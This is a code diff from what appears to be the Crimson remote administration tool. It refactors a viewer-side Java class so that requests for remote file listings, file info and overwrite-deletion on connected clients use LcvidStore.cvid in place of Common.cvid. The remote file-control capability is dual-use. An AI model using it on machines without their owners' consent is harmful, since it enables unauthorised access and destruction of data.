@@ -19,7 +19,6 @@ package com.subterranean_security.crimson.viewer.net.command;
 
 import java.util.ArrayList;
 
-import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
 import com.subterranean_security.crimson.core.proto.FileManager.MI_CloseFileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_AdvancedFileInfo;
@@ -31,12 +30,13 @@ import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
 import com.subterranean_security.crimson.core.store.ConnectionStore;
+import com.subterranean_security.crimson.core.store.LcvidStore;
 
 public class FileManagerCom {
 	public static int getFileHandle(int cid) {
 		try {
 			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqFileHandle(RQ_FileHandle.newBuilder()),
+					Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid).setRqFileHandle(RQ_FileHandle.newBuilder()),
 					2);
 			if (m != null) {
 				return m.getRsFileHandle().getFmid();
@@ -61,7 +61,7 @@ public class FileManagerCom {
 
 	public static RS_FileListing fm_down(int cid, int fmid, String name, boolean mtime, boolean size) {
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
 					.setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 10);
 			return m.getRsFileListing();
 		} catch (Exception e) {
@@ -71,7 +71,7 @@ public class FileManagerCom {
 
 	public static RS_FileListing fm_up(int cid, int fmid, boolean mtime, boolean size) {
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
 					.setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 10);
 			return m.getRsFileListing();
 		} catch (Exception e) {
@@ -81,7 +81,7 @@ public class FileManagerCom {
 
 	public static RS_FileListing fm_list(int cid, int fmid, boolean mtime, boolean size) {
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
 					.setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 10);
 			return m.getRsFileListing();
 		} catch (Exception e) {
@@ -91,7 +91,7 @@ public class FileManagerCom {
 
 	public static RS_AdvancedFileInfo fm_file_info(int cid, String path) {
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
 					.setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 10);
 			return m.getRsAdvancedFileInfo();
 		} catch (InterruptedException e) {
@@ -107,7 +107,7 @@ public class FileManagerCom {
 	public static Outcome fm_delete(int cid, ArrayList<String> targets, boolean overwrite) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
 					.setRqDelete(RQ_Delete.newBuilder().addAllTarget(targets).setOverwrite(overwrite)), 10);
 
 			if (m == null) {
